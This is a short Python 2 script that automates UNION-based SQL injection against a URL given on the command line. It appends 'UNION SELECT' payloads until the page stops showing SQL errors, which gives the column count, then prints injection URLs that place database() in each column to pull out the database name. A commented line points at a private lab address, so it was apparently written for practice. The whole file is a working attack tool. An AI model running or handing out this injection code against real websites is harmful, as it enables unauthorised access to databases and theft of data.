#!/usr/bin/python
import os, sys, urllib2
import json

# Grab page with urllib and split on whitespace
def getPage(page):
    if 'http://' not in page:
        page = 'http://' + page

    # Try to get HTML, read if successful
    try:
        message = urllib2.urlopen(page)
    except urllib2.HTTPError as e:
        print e

    return message.read().split()

# Return diff between two lists of html
def html_diff(i, j):
    diff = list(set(j) - set(i))
    return diff

# Get size of table
# Try unions until no SQL errors returned
def get_table_size(page):
    count = 1

    original_page = getPage(page)
    union = page + '%20UNION%20SELECT%201'

    while 'SELECT' in html_diff(original_page, getPage(union)):
        count += 1
        union += ',%20' + str(count)

    return count

if __name__ == '__main__':

    page = sys.argv[1]

    #if '-f' in sys.argv:
    #    print sys.argv.index('-f') 
    columns = get_table_size(page)

    page1 = getPage(page)
    #page2 = getPage(page + '%20UNION%20SELECT%201,%20database(),%202,%203')

    #page2 = getPage('192.168.83.130/cat.php?id=1%20UNION%20SELECT%201,%20database(),%202')
    #union = page + '%20UNION%20SELECT'
    #while 
    #    count += 1
    #    union += ',%20' + str(count)

    #print html_diff(page1, page2)

    union_urls = ['%20' + str(i) for i in xrange(1, columns) ]
    #union_urls.append('%20database()') 
    for i in xrange(0, len(union_urls) + 1):
        #print union_urls[:i] + ['%20database()'] + union_urls[i:]
        new_url = page + '%20UNION%20SELECT' + ",".join(union_urls[:i] + ['%20database()'] + union_urls[i:])
        print new_url
        #print html_diff(page1, getPage(new_url))







